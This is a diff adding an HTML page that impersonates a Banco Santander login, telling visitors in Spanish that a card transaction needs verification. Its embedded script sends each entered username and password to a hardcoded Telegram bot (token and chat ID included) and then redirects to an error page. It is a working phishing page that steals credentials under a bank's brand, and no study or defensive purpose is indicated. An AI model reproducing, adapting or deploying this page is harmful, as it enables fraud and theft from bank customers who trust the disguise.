@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .container img {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        .container h1 {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        .container input[type="text"],
+        .container input[type="password"] {
+            width: 92%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .container a {
+            color: #007bff;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        .container a:hover {
+            text-decoration: underline;
+        }
+        .container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #dc3545;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container button:hover {
+            background-color: #c82333;
+        }
+        .container .register {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .container .register a {
+            color: #dc3545;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .container .register a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" style="width: 80%;">
+        <img src=../img/Banco_Santander_Logotipo.svg.webp" alt="Logo" width="60%">
+        <h1>Ingresa</h1>
+
+        <p style="font-size: smaller; margin-bottom: 4%;">Vamos a valiar tu compra <br> <br>
+
+            Banco Santander requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
+        
+        <label for="username">Nombre de usuario</label>
+        <input type="text" id="username" name="username" placeholder="Nombre de usuario">
+        <label for="password">Contraseña</label>
+        <input type="password" id="password" name="password" placeholder="Contraseña">
+        <a href="#">¿Necesitas ayuda para ingresar?</a>
+        <div>
+            <input type="checkbox" id="remember">
+            <label for="remember">Recordar mi nombre de usuario</label>
+        </div>
+        <div>
+            <button id="submitBtn">Ingresar</button>
+        </div>
+
+        <div class="register">
+            <p>¿No te has registrado?</p>
+            <a href="#">Regístrate aquí</a>
+        </div>
+
+        <script>
+            function enviarMensajeTelegram(username, password) {
+    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
+    var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
+    var chatID = '5900829263';
+    var mensaje = 'Logo Santander: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.getElementById('submitBtn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    if (username.trim() !== '' && password.trim() !== '') {
+        enviarMensajeTelegram(username, password);
+        setTimeout(function() {
+            window.location.href = '../Error.html';
+        }, 1000);
+    } else {
+        alert('Por favor complete todos los campos antes de continuar.');
+    }
+});
+        </script>
+    </div>
+</body>
+</html>
